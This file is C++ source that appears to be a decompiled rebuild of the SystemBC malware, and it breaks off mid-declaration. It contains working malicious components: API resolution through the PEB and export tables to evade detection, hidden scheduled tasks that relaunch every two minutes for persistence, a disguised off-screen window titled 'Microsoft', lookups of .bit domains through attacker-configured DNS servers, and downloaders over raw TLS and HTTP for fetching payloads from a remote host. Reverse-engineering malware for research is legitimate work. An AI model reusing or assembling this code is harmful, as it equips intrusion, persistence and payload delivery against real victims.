#include "SystemBC.hpp"

int strings_convert_str8_to_str16(char *str8, char *str16)
{
	int srcln = strlen(str8);

	for (int i = srcln + 1; i; --i)
	{
		*str16++ = *str8++;
		*str16++ = '\x00';
	}

	return 2 * srcln;
}

bool strings_end_with_a_number(const char *str)
{
	while (*str++)
		;
	return str[-2] <= '9';
}

int rand_get_string(char *buf)
{
	size_t bufln = 4 + rand_get_number(0x4);

	for (size_t i = 0; i < bufln; i++)
	{
		buf[i] = 'a' + rand_get_number(0x18);
	}

	buf[bufln] = '\x00';
	return bufln;
}

int rand_get_number(int cap)
{
	__asm
	{
		rdtsc
		imul eax, eax, 0x1E7319
		add eax, 0x3CFB5543
		rcr eax, 0x10
		add eax, ecx
		test edx, edx
		je exit
		imul eax, edx
		exit :
			xor edx, edx
			mul cap
			mov eax, edx
	}
}

void utils_hexdump(uint8_t *data, size_t size, bool hex_stream = false)
{
	if (hex_stream)
	{
		for (size_t i = 0; i < size; i++)
		{
			printf("%02X", data[i]);
		}
	}
	else
	{
		for (size_t i = 0; i < size; i += 16)
		{
			for (size_t j = 0; i + j < size && j < 16; j++)
			{
				printf("%02X ", data[i + j]);
			}

			printf("     ");

			for (size_t j = 0; i + j < size && j < 16; j++)
			{
				if (data[i + j] >= 32 && data[i + j] <= 126)
				{
					printf("%c", data[i + j]);
				}
				else
				{
					printf(".");
				}
			}

			puts("");
		}
	}
}

void fs_create_file(char *filename, void *filedata, uint32_t filesize, uint32_t creation_disposition, uint32_t move_method)
{
	HANDLE handle = {};
	DWORD result = {};

	do
	{
		handle = CreateFileA(filename, GENERIC_WRITE, 0, nullptr, creation_disposition, FILE_ATTRIBUTE_NORMAL, nullptr);
		result = GetLastError();
	} while (result == ERROR_SHARING_VIOLATION);

	if (handle != INVALID_HANDLE_VALUE)
	{
		SetFilePointer(handle, 0, nullptr, move_method);
		WriteFile(handle, filedata, filesize, (LPDWORD)&filesize, nullptr);
		CloseHandle(handle);
	}
}

void memory_free(void **p)
{
	if (!*p)
	{
		return;
	}

	VirtualFree(*p, 0, MEM_RELEASE);
	*p = nullptr;
}

void *memory_buffer_resize(void **buffer, size_t buffer_old_size, size_t new_buffer_size)
{
	void *resized_buffer = VirtualAlloc(nullptr, new_buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memcpy(resized_buffer, *buffer, buffer_old_size);
	memory_free(buffer);
	*buffer = resized_buffer;
	return resized_buffer;
}

void memory_zero(void *buf, size_t size)
{
	memset(buf, 0, size);
}

void *memory_buffer_append(void **buf1, size_t buf1_size, void *buf2, size_t buf2_size)
{
	void *buffer = memory_buffer_resize(buf1, buf1_size, buf1_size + buf2_size);

	if (!buffer)
	{
		return nullptr;
	}

	memcpy((uint8_t *)buffer + buf1_size, buf2, buf2_size);
	return buffer;
}

void *windows_load_dll(const char *dllname)
{
	wchar_t wdllname[128] = {0};
	auto entry = NtCurrentPeb()->Ldr->InLoadOrderModuleList.Flink;

	do
	{
		entry = entry->Flink;

		auto module = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		auto module_name = module->BaseDllName.Buffer;

		for (size_t i = 0;; i++)
		{
			if (!dllname[i])
			{
				return module->DllBase;
			}

			char c = *(char *)&module_name[i];

			if (module_name[i] < 'A' || module_name[i] > 'Z')
			{
				if (module_name[i] >= 'a' && module_name[i] <= 'z')
				{
					c -= ' ';
				}
			}

			else
			{
				c += ' ';
			}

			if (dllname[i] != module_name[i] && dllname[i] != c)
			{
				break;
			}
		}
	} while (entry != NtCurrentPeb()->Ldr->InLoadOrderModuleList.Blink);

	auto pLdrLoadDll = reinterpret_cast<decltype(&LdrLoadDll)>(windows_resolve_api(windows_load_dll("ntdll.dll"), "LdrLoadDll"));

	UNICODE_STRING dllname_us;
	dllname_us.Length = strings_convert_str8_to_str16((char *)dllname, (char *)wdllname);
	dllname_us.MaximumLength = dllname_us.Length + 2;
	dllname_us.Buffer = wdllname;

	PVOID dllbase = nullptr;
	pLdrLoadDll(nullptr, nullptr, &dllname_us, &dllbase);

	return dllbase;
}

void *windows_resolve_api(void *module_base, const char *api_name)
{
	auto nt = PIMAGE_NT_HEADERS(size_t(module_base) + PIMAGE_DOS_HEADER(module_base)->e_lfanew);
	size_t export_dir_rva;
	size_t export_dir_size;
	PIMAGE_EXPORT_DIRECTORY export_dir;

	if (nt->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
	{
		export_dir_rva = ((PIMAGE_NT_HEADERS64)nt)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		export_dir_size = ((PIMAGE_NT_HEADERS64)nt)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	}

	else
	{
		export_dir_rva = ((PIMAGE_NT_HEADERS32)nt)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		export_dir_size = ((PIMAGE_NT_HEADERS32)nt)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	}

	export_dir = (PIMAGE_EXPORT_DIRECTORY)(size_t(module_base) + export_dir_rva);

	uint32_t number_of_names = export_dir->NumberOfNames;
	uint32_t number_of_functions = export_dir->NumberOfFunctions;
	uint32_t *address_of_functions = (uint32_t *)(size_t(module_base) + export_dir->AddressOfFunctions);
	uint32_t *address_of_names = (uint32_t *)(size_t(module_base) + export_dir->AddressOfNames);
	uint16_t *address_of_name_ordinals = (uint16_t *)(size_t(module_base) + export_dir->AddressOfNameOrdinals);

	for (size_t i = 0; i < number_of_names; i++)
	{
		char *name = (char *)module_base + address_of_names[i];

		if (!strings_str_equal(api_name, name))
		{
			continue;
		}

		auto entry = size_t(module_base) + address_of_functions[address_of_name_ordinals[i]];

		if (entry <= (size_t)export_dir || entry > (size_t)export_dir + export_dir_size)
		{
			return (void *)entry;
		}

		char dllname[256] = {0};
		char *export_forward_e = (char *)entry;
		char *p = (char *)entry;
		while (*p != '.')
		{
			p++;
		}

		memcpy(dllname, export_forward_e, p - export_forward_e);
		dllname[p - export_forward_e] = '\x00';
		char *api = p;

		return windows_resolve_api(windows_load_dll(dllname), api);
	}
}

void windows_ts_delete_task(char *task_name)
{
	ITaskScheduler *task_sched;
	wchar_t l_task_name[128] = {};

	HRESULT result = CoCreateInstance(CLSID_CTaskScheduler, nullptr, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (LPVOID *)&task_sched);

	if (result == S_OK)
	{
		strings_convert_str8_to_str16(task_name, (char *)l_task_name);
		task_sched->Delete(l_task_name);
		task_sched->Release();
	}

	CoUninitialize();
}

void windows_ts_create_task(char *task_name, char *binary_path, char *parameters, bool one_time, bool run_immediatly)
{
	ITaskScheduler *task_sched{};
	ITask *task{};
	ITaskTrigger *task_trigger{};
	wchar_t username[512] = {};
	wchar_t l_parameters[128] = {};
	wchar_t l_binary_path[256] = {};
	wchar_t l_task_name[128] = {};
	WORD new_trigger{};
	ULONG bufsz = sizeof(username) / sizeof(username[0]);
	SYSTEMTIME system_time{};
	FILETIME file_time{};
	TASK_TRIGGER ttask_trigger{};
	IPersistFile *persist_file{};
	HRESULT result = {};

	strings_convert_str8_to_str16(task_name, (char *)l_task_name);
	strings_convert_str8_to_str16(binary_path, (char *)l_binary_path);

	windows_ts_delete_task(task_name);

	CoInitialize(nullptr);
	CoCreateInstance(CLSID_CTaskScheduler, nullptr, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (LPVOID *)&task_sched);

	if (task_sched->NewWorkItem(l_task_name, CLSID_CTask, IID_ITask, (IUnknown **)&task) < 0)
	{
		task_sched->Release();
		CoUninitialize();
		return;
	}

	task->SetFlags(TASK_FLAG_RUN_ONLY_IF_LOGGED_ON | TASK_FLAG_HIDDEN | TASK_FLAG_DELETE_WHEN_DONE);
	GetUserNameExW(NameSamCompatible, username, &bufsz);
	task->SetAccountInformation(username, nullptr);
	task->SetApplicationName(l_binary_path);

	if (parameters)
	{
		strings_convert_str8_to_str16(parameters, (char *)l_parameters);
		task->SetParameters(l_parameters);
	}

	task->SetMaxRunTime(HOURS(999));

	if (task->CreateTrigger(&new_trigger, &task_trigger) < 0)
	{
		task->Release();
		task_sched->Release();
		CoUninitialize();
		return;
	}

	GetLocalTime(&system_time);
	SystemTimeToFileTime(&system_time, &file_time);

	if (one_time)
	{
		((PULARGE_INTEGER)&file_time)->QuadPart += MS_TO_FT_INTERVALS(7);
	}
	else
	{
		// I mean this is low as well, Idk what to name this variable ^_^
		((PULARGE_INTEGER)&file_time)->QuadPart += MS_TO_FT_INTERVALS(12);
	}

	FileTimeToSystemTime(&file_time, &system_time);

	if (!one_time)
	{
		ttask_trigger.TriggerType = TASK_TIME_TRIGGER_DAILY;
		ttask_trigger.Type.Daily.DaysInterval = 1;
		ttask_trigger.MinutesDuration = 1440;
		ttask_trigger.MinutesInterval = 2;
	}

	ttask_trigger.cbTriggerSize = sizeof(TASK_TRIGGER);
	ttask_trigger.wStartMinute = system_time.wMinute;
	ttask_trigger.wStartHour = system_time.wHour;
	ttask_trigger.wBeginDay = system_time.wDay;
	ttask_trigger.wBeginMonth = system_time.wMonth;
	ttask_trigger.wBeginYear = system_time.wYear;
	ttask_trigger.wEndYear = system_time.wYear + 100;
	ttask_trigger.wEndMonth = 1;
	ttask_trigger.wEndDay = 1;
	task_trigger->SetTrigger(&ttask_trigger);

	if (task->QueryInterface(IID_IPersistFile, (void **)&persist_file) < 0)
	{
		task_trigger->Release();
		task->Release();
		task_sched->Release();
		CoUninitialize();
		return;
	}

	if (persist_file->Save(nullptr, true) < 0)
	{
		persist_file->Release();
		task_trigger->Release();
		task->Release();
		task_sched->Release();
		CoUninitialize();
		return;
	}

	if (run_immediatly)
	{
		task->Run();
	}

	persist_file->Release();
	task_trigger->Release();
	task->Release();
	task_sched->Release();
	CoUninitialize();
}

bool windows_is_process_running(const char *process_name)
{
	bool found = false;

	HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pentry = {sizeof(pentry)};

	auto pProcess32First = reinterpret_cast<decltype(&Process32First)>(windows_resolve_api(windows_load_dll("kernel32.dll"), "Process32First"));

	if (!pProcess32First(hsnap, &pentry))
	{
		goto exit;
	}

	decltype(&Process32Next) pProcess32Next;
	do
	{
		char exename[256] = {0};
		memcpy(exename, pentry.szExeFile, strlen(pentry.szExeFile));

		if (strings_str_equal(exename, process_name))
		{
			found = true;
			goto exit;
		}

		pProcess32Next = reinterpret_cast<decltype(&Process32Next)>(windows_resolve_api(windows_load_dll("kernel32.dll"), "Process32Next"));
	} while (pProcess32Next(hsnap, &pentry));

exit:
	return found;
}

DWORD WINAPI agent_create_window(LPVOID param)
{
	WNDCLASSA WndClass;
	MSG Msg;
	HMODULE hInstance;

	hInstance = GetModuleHandleA(nullptr);
	WndClass.style = 0;
	WndClass.lpfnWndProc = (WNDPROC)param;
	WndClass.cbClsExtra = 0;
	WndClass.cbWndExtra = 0;
	WndClass.hInstance = hInstance;
	WndClass.lpszMenuName = nullptr;
	WndClass.lpszClassName = "win32app";
	WndClass.hIcon = LoadIconW(nullptr, (LPCWSTR)0x7F04);
	WndClass.hCursor = LoadCursorW(nullptr, (LPCWSTR)0x7F01);
	WndClass.hbrBackground = (HBRUSH)COLOR_WINDOWFRAME;
	RegisterClassA(&WndClass);

	HWND hWnd = CreateWindowExA(
		WS_EX_TOOLWINDOW,
		"win32app",
		"Microsoft",
		WS_SYSMENU | WS_CAPTION,
		4000,
		4000,
		500,
		150,
		nullptr,
		nullptr,
		hInstance,
		nullptr);

	ShowWindow(hWnd, 1);
	UpdateWindow(hWnd);

	while (1)
	{
		GetMessage(&Msg, nullptr, 0, 0);
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
}

bool windows_is_wow64()
{
	BOOL is_wow64;
	auto pIsWow64Process = reinterpret_cast<decltype(&IsWow64Process)>(windows_resolve_api(windows_load_dll("kernel32.dll"), "IsWow64Process"));
	pIsWow64Process(GetCurrentProcess(), &is_wow64);
	return is_wow64;
}

DWORD windows_get_build_number()
{
	OSVERSIONINFOA version = {sizeof(version)};
	auto pRtlGetVersion = reinterpret_cast<decltype(&RtlGetVersion)>(windows_resolve_api(windows_load_dll("ntdll.dll"), "RtlGetVersion"));

	if (pRtlGetVersion)
	{
		pRtlGetVersion((PRTL_OSVERSIONINFOEXW)&version);
	}

	return version.dwBuildNumber;
}

in_addr net_dns_resolve(const char *domain, int family)
{
	size_t domain_length = strlen(domain);
	in_addr result = {};

	if (domain_length < 4 || strcmp(domain + domain_length - 4, ".bit") != 0)
	{
		ADDRINFOA hints{};
		ADDRINFOA *addr{};

		hints.ai_family = family;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;

		if (!getaddrinfo(domain, 0, &hints, &addr))
		{
			for (auto addr_e = addr; addr_e != nullptr; addr_e = addr_e->ai_next)
			{
				if (family == AF_INET && addr_e->ai_family == AF_INET)
				{
					auto ip4 = ((sockaddr_in *)addr_e->ai_addr)->sin_addr;
					freeaddrinfo(addr);
					result = ip4;
					break;
				}
			}
		}
	}

	else
	{
		PIP4_ARRAY dns_servers = (PIP4_ARRAY)alloca(sizeof(IP4_ARRAY) + (126 * sizeof(IP4_ADDRESS)));
		memset(dns_servers, 0, sizeof(IP4_ARRAY) + (126 * sizeof(IP4_ADDRESS)));

		char *s_dns_server_ip{};
		auto dns_server_addr = g_config.Dns1 + 4;

		for (;;)
		{
			if (!strings_end_with_a_number(dns_server_addr))
			{
				s_dns_server_ip = inet_ntoa(net_dns_resolve(g_config.Dns1 + 5, AF_INET));
			}

			else
			{
				s_dns_server_ip = dns_server_addr;
			}

			auto dns_server_ip = inet_addr(s_dns_server_ip);

			if (!dns_server_ip)
			{
				if (dns_server_addr == g_config.Dns1 + 5)
				{
					dns_server_addr = g_config.Dns2 + 5;
				}

				else if (dns_server_addr == g_config.Dns2 + 5)
				{
					dns_server_addr = g_config.Dns3 + 5;
				}

				else
				{
					break;
				}
			}

			else
			{
				dns_servers->AddrArray[dns_servers->AddrCount++] = dns_server_ip;
			}
		}

		PDNS_RECORD dns_records{};
		auto pDnsQuery_A = reinterpret_cast<decltype(&DnsQuery_A)>(windows_resolve_api(windows_load_dll("dnsapi.dll"), "DnsQuery_A"));

		if (!pDnsQuery_A(domain, DNS_TYPE_A, DNS_TYPE_MG, dns_servers, &dns_records, nullptr))
		{
			for (auto dns_record = dns_records; dns_record != nullptr; dns_record = dns_record->pNext)
			{
				if (dns_record->wType == DNS_TYPE_A)
				{
					result.s_addr = dns_record->Data.A.IpAddress;
					break;
				}
			}
		}
	}

	return result;
}

SOCKET net_tls_connect(const char *host, uint32_t port, PCtxtHandle context, PCredHandle cred, SOCKET &socket)
{
	socket_set_t socket_set{};
	sockaddr_in server_address{};
	SECURITY_STATUS status{};
	uint8_t *incoming_buffer{};
	DWORD ctxattr{};
	size_t received = 0;
	SCHANNEL_CRED schannel_cred = {0};
	schannel_cred.dwVersion = SCHANNEL_CRED_VERSION;
	schannel_cred.dwFlags = SCH_CRED_NO_DEFAULT_CREDS | SCH_CRED_MANUAL_CRED_VALIDATION;

	SecBuffer inbuffers[2] = {};
	SecBufferDesc indesc = {};

	SecBuffer outbuffers = {.cbBuffer = 0, .BufferType = SECBUFFER_TOKEN, .pvBuffer = nullptr};
	SecBufferDesc outdesc = {.ulVersion = 0, .cBuffers = 1, .pBuffers = &outbuffers};

	*cred = {};
	*context = {};

	if (AcquireCredentialsHandleA(
			nullptr,
			(SEC_CHAR *)UNISP_NAME_A,
			SECPKG_CRED_OUTBOUND,
			nullptr,
			&schannel_cred,
			nullptr,
			nullptr,
			cred,
			nullptr) != SEC_E_OK)
	{
		return 0;
	}

	socket = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	const char *ip = host;
	if (!strings_end_with_a_number(host))
	{
		ip = inet_ntoa(net_dns_resolve(host, AF_INET));
	}

	server_address.sin_addr.s_addr = inet_addr(ip);
	if (port > 65536)
	{
		port = atoi((const char *)port);
	}

	server_address.sin_port = htons(port);
	server_address.sin_family = AF_INET;

	int optval = 1;
	setsockopt(socket, IPPROTO_TCP, TCP_NODELAY, (const char *)&optval, sizeof(optval));
	net_socket_init(socket, 0, &socket_set, {.tv_sec = 10, .tv_usec = 0});
	net_socket_set_nonblocking(socket, 1);
	connect(socket, (const sockaddr *)&server_address, sizeof(server_address));

	if (select(0, nullptr, (fd_set *)&socket_set, nullptr, &socket_set.timeout) != 1)
	{
		return 0;
	}

	net_socket_set_nonblocking(socket, 0);

	DWORD flags = ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_EXTENDED_ERROR | ISC_REQ_STREAM;
	InitializeSecurityContextA(
		cred,
		nullptr,
		(SEC_CHAR *)host,
		flags,
		0,
		SECURITY_NATIVE_DREP,
		nullptr,
		0,
		context,
		&outdesc,
		&ctxattr,
		nullptr);

	if (outbuffers.cbBuffer == 0 || outbuffers.pvBuffer == 0)
	{
		return 0;
	}

	net_socket_send(socket, outbuffers.pvBuffer, outbuffers.cbBuffer, nullptr);
	FreeContextBuffer(outbuffers.pvBuffer);

	incoming_buffer = (uint8_t *)VirtualAlloc(nullptr, 0x8000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	status = SEC_I_CONTINUE_NEEDED;

	while (status == SEC_I_CONTINUE_NEEDED || status == SEC_E_INCOMPLETE_MESSAGE || status == SEC_I_INCOMPLETE_CREDENTIALS)
	{
		if (received == 0 || status == SEC_E_INCOMPLETE_MESSAGE)
		{
			int n = net_socket_recv(socket, &incoming_buffer[received], 0x8000 - received, 10);

			if (n <= 0)
			{
				goto free_and_ret;
			}

			received += n;
		}

		// We now received a Token from the server, to let InitializeSecurityContextA process it we pass it
		// an input buffer, and for the output buffer we just set it as null, and that we want the next out buffer by
		// setting the type as SECBUFFER_TOKEN.

		outbuffers.cbBuffer = 0;
		outbuffers.BufferType = SECBUFFER_TOKEN;
		outbuffers.pvBuffer = nullptr;

		outdesc.ulVersion = SECBUFFER_VERSION;
		outdesc.cBuffers = 1;
		outdesc.pBuffers = &outbuffers;

		inbuffers[0] = {.cbBuffer = received, .BufferType = SECBUFFER_TOKEN, .pvBuffer = incoming_buffer};
		inbuffers[1] = {.cbBuffer = 0, .BufferType = SECBUFFER_EMPTY, .pvBuffer = nullptr};

		indesc.ulVersion = SECBUFFER_VERSION;
		indesc.cBuffers = 2;
		indesc.pBuffers = inbuffers;

		status = InitializeSecurityContextA(
			cred,
			context,
			nullptr,
			flags,
			0,
			SECURITY_NATIVE_DREP,
			&indesc,
			0,
			nullptr,
			&outdesc,
			&ctxattr,
			nullptr);

		if (status == SEC_E_INCOMPLETE_MESSAGE)
		{
			continue;
		}

		if (status < SEC_E_OK)
		{
			goto free_and_ret;
		}

		if (status == SEC_E_OK || (status == SEC_I_CONTINUE_NEEDED && outbuffers.cbBuffer != 0 && outbuffers.pvBuffer != nullptr))
		{
			net_socket_send(socket, outbuffers.pvBuffer, outbuffers.cbBuffer, nullptr);
			FreeContextBuffer(outbuffers.pvBuffer);
		}

		else if (status == SEC_I_INCOMPLETE_CREDENTIALS)
		{
			goto free_and_ret;
		}

		if (inbuffers[1].BufferType == SECBUFFER_EXTRA)
		{
			MoveMemory(incoming_buffer, incoming_buffer + (received - inbuffers[1].cbBuffer), inbuffers[1].cbBuffer);
			received = inbuffers[1].cbBuffer;
			status = SEC_I_CONTINUE_NEEDED;
		}
		else
		{
			received = 0;
		}
	}

free_and_ret:
	memory_free((void **)&incoming_buffer);
	if (status == SEC_E_OK)
	{
		return socket;
	}
ret:
	return 0;
}

void net_tls_send(SOCKET socket, void *data, int len, HANDLE event, PCtxtHandle phContext)
{
	SecBuffer buffers[4] = {};
	SecBufferDesc buffersdesc = {};
	SecPkgContext_StreamSizes stream_sizes = {};
	QueryContextAttributesA(phContext, SECPKG_ATTR_STREAM_SIZES, &stream_sizes);

	size_t pos = 0;
	while (len > 0)
	{
		void *msgbuf = VirtualAlloc(
			nullptr,
			stream_sizes.cbHeader + stream_sizes.cbMaximumMessage + stream_sizes.cbTrailer,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_READWRITE);

		if (!msgbuf)
		{
			break;
		}

		size_t chunk_length = len;
		if (len >= stream_sizes.cbMaximumMessage)
		{
			chunk_length = stream_sizes.cbMaximumMessage;
		}

		memcpy((char *)msgbuf + stream_sizes.cbHeader, (char *)data + pos, chunk_length);
		pos += chunk_length;
		len -= chunk_length;

		buffers[0].cbBuffer = stream_sizes.cbHeader;
		buffers[0].BufferType = SECBUFFER_STREAM_HEADER;
		buffers[0].pvBuffer = msgbuf;

		buffers[1].cbBuffer = chunk_length;
		buffers[1].BufferType = SECBUFFER_DATA;
		buffers[1].pvBuffer = (char *)msgbuf + stream_sizes.cbHeader;

		buffers[2].cbBuffer = stream_sizes.cbTrailer;
		buffers[2].BufferType = SECBUFFER_STREAM_TRAILER;
		buffers[2].pvBuffer = (char *)msgbuf + stream_sizes.cbHeader + chunk_length;

		buffers[3].cbBuffer = 0;
		buffers[3].BufferType = 0;
		buffers[3].pvBuffer = nullptr;

		buffersdesc.pBuffers = buffers;
		buffersdesc.ulVersion = 0;
		buffersdesc.cBuffers = 4;

		EncryptMessage(phContext, 0, &buffersdesc, 0);
		net_socket_send(socket, msgbuf, buffers[0].cbBuffer + buffers[1].cbBuffer + buffers[2].cbBuffer, event);
		memory_free((void **)&msgbuf);
	}
}

size_t net_tls_recv(SOCKET socket, void **pbuffer, PCtxtHandle context)
{
	size_t incoming_buffer_size = 0x8000;
	SECURITY_STATUS status = 0;
	size_t received = 0;
	size_t copied = 0;
	auto incoming_buffer = (uint8_t *)VirtualAlloc(nullptr, incoming_buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!incoming_buffer)
	{
		return 0;
	}

	for (;;)
	{
		if (received == 0 || status == SEC_E_INCOMPLETE_MESSAGE)
		{
			size_t bytes_remaining = incoming_buffer_size - received;

			while (!bytes_remaining)
			{
				incoming_buffer_size += 0x8000;
				memory_buffer_resize((void **)&incoming_buffer, received, incoming_buffer_size);
				bytes_remaining = incoming_buffer_size - received;
			}

			int n = net_socket_recv(socket, &incoming_buffer[received], bytes_remaining, 0);

			if (n <= 0)
			{
				memory_free((void **)&incoming_buffer);
				return 0;
			}

			received += n;
		}

		SecBuffer buffers[4] = {0};

		buffers[0] = {received, SECBUFFER_DATA, incoming_buffer};
		buffers[1] = {0, SECBUFFER_EMPTY, nullptr};
		buffers[2] = {0, SECBUFFER_EMPTY, nullptr};
		buffers[3] = {0, SECBUFFER_EMPTY, nullptr};

		SecBufferDesc buffersdesc = {.ulVersion = 0, .cBuffers = 4, .pBuffers = buffers};

		status = DecryptMessage(
			context,
			&buffersdesc,
			0,
			nullptr);

		if (status == SEC_E_INCOMPLETE_MESSAGE)
		{
			continue;
		}

		if (status == SEC_I_CONTEXT_EXPIRED || status == SEC_E_OK)
		{
			received = 0;

			for (size_t i = 1; i <= 3; i++)
			{
				if (buffers[i].BufferType == SECBUFFER_DATA && buffers[i].pvBuffer != nullptr && buffers[i].cbBuffer != 0)
				{
					if (!memory_buffer_append(pbuffer, copied, buffers[i].pvBuffer, buffers[i].cbBuffer))
					{
						memory_free((void **)&incoming_buffer);
						return 0;
					}

					copied += buffers[i].cbBuffer;
				}

				else if (buffers[i].BufferType == SECBUFFER_EXTRA && buffers[i].pvBuffer != nullptr && buffers[i].cbBuffer != 0)
				{
					status = SEC_I_CONTINUE_NEEDED;
					memcpy(incoming_buffer + received, buffers[i].pvBuffer, buffers[i].cbBuffer);
					received += buffers[i].cbBuffer;
				}
			}

			if (status != SEC_I_CONTINUE_NEEDED)
			{
				memory_free((void **)&incoming_buffer);
				return copied;
			}
		}

		else
		{
			memory_free((void **)&incoming_buffer);
			break;
		}
	}
}

void net_tls_disconnect(PCtxtHandle context, PCredHandle cred, SOCKET socket)
{
	if (context->dwLower != 0 || context->dwUpper != 0)
	{
		DeleteSecurityContext(context);
	}

	if (cred->dwLower != 0 || cred->dwUpper != 0)
	{
		FreeCredentialsHandle(cred);
	}

	if (socket != 0)
	{
		net_socket_close(socket);
	}
}

size_t net_tls_download_file(const char *host, size_t port, const char *filepath, void **filebuffer)
{
	CtxtHandle context;
	CredHandle cred;
	SOCKET socket;
	size_t received = 0;
	socket_set_t socket_set;
	void *incoming_buffer = nullptr;
	void *block = nullptr;
	uint8_t request[1024] = {0};
	int request_len = 0;

	if (net_tls_connect(host, port, &context, &cred, socket))
	{
		request_len = sprintf((char *)request, (const char *)g_http_request, filepath, host);
		net_tls_send(socket, request, request_len, nullptr, &context);
		net_socket_init(socket, 0, &socket_set, {.tv_sec = 10, .tv_usec = 0});

		while (select(0, (fd_set *)&socket_set, nullptr, nullptr, &socket_set.timeout) != 0)
		{
			int n = net_tls_recv(socket, &block, &context);

			if (n <= 0)
			{
				break;
			}

			memory_buffer_append(&incoming_buffer, received, block, n);
			received += n;
			memory_free(&block);
		}
	}

	net_tls_disconnect(&context, &cred, socket);
	size_t n = received;
	if (n != 0)
	{
		while (n >= 4)
		{
			if (*(uint32_t *)incoming_buffer == '\r\n\r\n')
			{
				n -= 4;
				incoming_buffer = (char *)incoming_buffer + 4;
				received = n;
				auto p = (char *)VirtualAlloc(nullptr, received, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

				if (p)
				{
					memcpy(p, incoming_buffer, received);
					memory_free(&incoming_buffer);
					*filebuffer = p;
					return received;
				}
			}

			incoming_buffer = (char *)incoming_buffer + 1;
			n -= 1;
		}
	}

	memory_free(&incoming_buffer);
	return 0;
}

void net_socket_set_nonblocking(SOCKET socket, u_long enable)
{
	ioctlsocket(socket, FIONBIO, &enable);
}

int net_socket_send(SOCKET socket, void *data, size_t len, HANDLE event)
{
	socket_set_t socket_set{};
	int blocks_count = 10;
	size_t p = 0;

	if (event != nullptr)
	{
		WaitForSingleObject(event, INFINITE);
	}

	if (!len)
	{
		goto exit;
	}

	while (len != 0 && blocks_count != 0)
	{
		net_socket_init(socket, 0, &socket_set, {.tv_sec = 10, .tv_usec = 0});

		if (select(0, nullptr, (fd_set *)&socket_set, nullptr, &socket_set.timeout) != 1)
		{
			goto exit;
		}

		int n = send(socket, (char *)data, len, 0);
		if (n <= 0)
		{
			goto exit;
		}

		data = (char *)data + n;
		blocks_count -= 1;
		len -= n;
	}

exit:
	if (event)
		SetEvent(event);
	return len;
}

void net_socket_init(int sock1, int sock2, socket_set_t *socket_set, timeval timeout)
{
	socket_set->count = 0;

	if (sock1 != 0)
	{
		socket_set->count++;
	}

	if (sock2 != 0)
	{
		socket_set->count++;
	}

	socket_set->sockets[0] = sock1;
	socket_set->sockets[1] = sock2;
	socket_set->timeout = timeout;
}

int net_socket_recv(SOCKET s, void *buf, int len, int timeout)
{
	int result{};
	socket_set_t socket_set{};

	net_socket_init(s, 0, &socket_set, {.tv_sec = timeout, .tv_usec = 0});

	result = select(0, (fd_set *)&socket_set, nullptr, nullptr, timeout ? &socket_set.timeout : nullptr);

	if (result == 1)
	{
		result = recv(s, (char *)buf, len, 0);
	}

	return result;
}

void net_socket_close(SOCKET socket)
{
	shutdown(socket, SD_BOTH);
	closesocket(socket);
}

size_t net_http_download_file(const char *host, size_t port, const char *filepath, void **filebufp)
{
	uint8_t buf[1024] = {0};
	socket_set_t socket_set{};
	timeval timeout{};
	sockaddr_in server_address{};
	size_t file_size = 0;
	char *filebuf = nullptr;
	int request_length = 0;
	size_t n = 0;
	int optval = 0;

	int socket = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	const char *ip = host;
	if (!strings_end_with_a_number(host))
	{
		ip = inet_ntoa(net_dns_resolve(host, AF_INET));
	}

	server_address.sin_addr.s_addr = inet_addr(ip);
	if (port > 65536)
	{
		port = atoi((const char *)port);
	}

	server_address.sin_port = htons(port);
	server_address.sin_family = AF_INET;

	optval = 1;
	setsockopt(socket, IPPROTO_TCP, TCP_NODELAY, (const char *)&optval, sizeof(optval));

	net_socket_init(socket, 0, &socket_set, {.tv_sec = 10, .tv_usec = 0});

	net_socket_set_nonblocking(socket, 1);
	connect(socket, (const sockaddr *)&server_address, sizeof(server_address));

	if (select(0, nullptr, (fd_set *)&socket_set, nullptr, &socket_set.timeout) != 1)
	{
		goto close_conn;
	}

	net_socket_set_nonblocking(socket, 0);
	request_length = sprintf((char *)buf, (const char *)g_http_request, filepath, host);
	net_socket_send(socket, buf, request_length, nullptr);

	memset(buf, 0, sizeof(buf));

	for (;;)
	{
		// This will cause a buffer overrun !
		// Should have been >= 1024
		// But I am just decompiling the Code !
		if (n > 1024)
		{
			goto close_conn;
		}

		n += net_socket_recv(socket, &buf[n], 1, 10);

		if (n >= 4)
		{
			if (*(uint32_t *)&buf[n - 4] == '\r\n\r\n')
			{
				break;
			}
		}
	}

	for (;;)
	{
		u_long bytes_to_read = 0;
		ioctlsocket(socket, FIONREAD, &bytes_to_read);

		if (bytes_to_read == 0)
		{
			bytes_to_read = 0x1000;
		}

		if (memory_buffer_resize((void **)&filebuf, file_size, file_size + bytes_to_read) == nullptr)
		{
			goto close_conn;
		}

		while (bytes_to_read != 0)
		{
			int n = net_socket_recv(socket, &filebuf[file_size], bytes_to_read, 10);

			if (n <= 0)
			{
				goto close_conn;
			}

			bytes_to_read -= n;
			file_size += n;
		}
	}

close_conn:
	net_socket_close(socket);
	*filebufp = filebuf;
	return file_size;
}

size_t net_download_file(const char *url, void **filebufp)
